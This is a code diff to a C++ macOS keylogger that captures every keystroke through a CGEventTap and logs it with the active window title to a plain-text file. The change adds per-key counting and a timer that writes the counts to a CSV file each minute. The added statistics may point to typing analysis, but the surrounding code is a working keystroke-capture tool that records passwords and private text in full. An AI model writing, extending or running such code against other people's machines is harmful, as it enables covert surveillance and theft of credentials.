@@ -1,5 +1,6 @@
 #include <iostream>
 #include <fstream>
+#include <map>
 #include <ApplicationServices/ApplicationServices.h>
 #include <ctime>
 #include <string>
@@ -9,6 +10,7 @@ using namespace std;
 
 string prevWindow = "";
 string currWindow = "";
+map<string, int> keyCount;
 
 string getActiveWindowTitle()
 {
@@ -47,49 +49,51 @@ void logger(CGEventRef event, ofstream &logfile)
 
     CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    string keyStr;
+
     switch (keycode)
     {
     case kVK_Shift:
-        logfile << "[SHIFT]";
+        keyStr = "[SHIFT]";
         break;
     case kVK_Return:
-        logfile << "[RETURN]";
+        keyStr = "[RETURN]";
         break;
     case kVK_Delete:
-        logfile << "[DELETE]";
+        keyStr = "[DELETE]";
         break;
     case kVK_Escape:
-        logfile << "[ESCAPE]";
+        keyStr = "[ESCAPE]";
         break;
     case kVK_Control:
-        logfile << "[CTRL]";
+        keyStr = "[CTRL]";
         break;
     case kVK_CapsLock:
-        logfile << "[CAPS_LOCK]";
+        keyStr = "[CAPS_LOCK]";
         break;
     case kVK_Option:
-        logfile << "[ALT]";
+        keyStr = "[ALT]";
         break;
     case kVK_Command:
-        logfile << "[CMD]";
+        keyStr = "[CMD]";
         break;
     case kVK_Tab:
-        logfile << "[TAB]";
+        keyStr = "[TAB]";
         break;
     case kVK_Space:
-        logfile << "[SPACE]";
+        keyStr = "[SPACE]";
         break;
     case kVK_LeftArrow:
-        logfile << "[LEFT_ARROW]";
+        keyStr = "[LEFT_ARROW]";
         break;
     case kVK_RightArrow:
-        logfile << "[RIGHT_ARROW]";
+        keyStr = "[RIGHT_ARROW]";
         break;
     case kVK_UpArrow:
-        logfile << "[UP_ARROW]";
+        keyStr = "[UP_ARROW]";
         break;
     case kVK_DownArrow:
-        logfile << "[DOWN_ARROW]";
+        keyStr = "[DOWN_ARROW]";
         break;
     default:
     {
@@ -98,10 +102,16 @@ void logger(CGEventRef event, ofstream &logfile)
         CGEventKeyboardGetUnicodeString(event, 4, &actualStringLength, unicodeString);
         if (actualStringLength > 0)
         {
-            logfile << string((char *)unicodeString, actualStringLength);
+            keyStr = string((char *)unicodeString, actualStringLength);
         }
     }
     break;
+    }
+
+    if (!keyStr.empty())
+    {
+        keyCount[keyStr]++;
+        logfile << keyStr;
     }
 
     logfile.flush();
@@ -117,6 +127,30 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
         logger(event, *logfile);
     }
     return event;
+}
+
+void writeKeyCountsToCSV(const map<string, int> &keyCount)
+{
+    ofstream csvfile("key_counts.csv");
+    if (!csvfile.is_open())
+    {
+        cerr << "Unable to open CSV file" << endl;
+        return;
+    }
+
+    csvfile << "Key,Count\n";
+    for (const auto &entry : keyCount)
+    {
+        csvfile << entry.first << "," << entry.second << "\n";
+    }
+
+    csvfile.close();
+}
+
+void updateCSVFile(CFRunLoopTimerRef timer, void *info)
+{
+    map<string, int> *keyCount = (map<string, int> *)info;
+    writeKeyCountsToCSV(*keyCount);
 }
 
 int main()
@@ -142,7 +176,20 @@ int main()
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
+    // Setup a timer to periodically update the CSV file (every minute in this case)
+    CFRunLoopTimerContext timerContext = {0, &keyCount, NULL, NULL, NULL};
+    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(kCFAllocatorDefault,
+                                                   CFAbsoluteTimeGetCurrent() + 60.0,
+                                                   60.0,
+                                                   0,
+                                                   0,
+                                                   (CFRunLoopTimerCallBack)updateCSVFile,
+                                                   &timerContext);
+    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopCommonModes);
+
     CFRunLoopRun();
+
+    writeKeyCountsToCSV(keyCount);
 
     logfile.close();
     return 0;
